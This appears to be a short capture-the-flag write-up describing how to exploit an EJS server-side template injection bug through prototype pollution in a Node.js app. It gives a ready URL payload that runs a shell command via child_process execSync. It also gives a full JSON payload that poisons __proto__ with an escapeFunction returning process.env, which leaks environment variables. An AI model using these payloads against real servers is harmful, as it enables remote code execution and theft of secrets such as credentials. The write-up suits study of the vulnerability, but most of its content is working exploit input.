https://github.com/mde/ejs/issues/735

This is based off the above issue.
There is a bug which if the 2nd parameter of the ejs render function is controlled by the user, then SSTI and RCE can be acheived
http://127.0.0.1:3000/?name=John&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('calc');


In this case however, the 2nd parameter is not controlled by the user, so we can't use this method.
Instead, there is a prototype pollution vulnerability in the code:
```javascript
graph[x][y][typeOrAlt] = value
```

As such, if we set x and y to `__proto__`, we can pollute the object prototype to be whatever we want. In ejs's case, the "view options" object is vulnerable to prototype pollution. Thus, we can let view options be 
```json
{
    "client": true,
    "escapeFunction": "1;return process.env;",
}
```

To make the code return the environment variables. Full payload:
```json
{"points":[
    {"x":"__proto__",
    "y":"__proto__",
    "typeOrAlt":"escapeFunction",
    "value":"1;return process.env;"
}]}
```

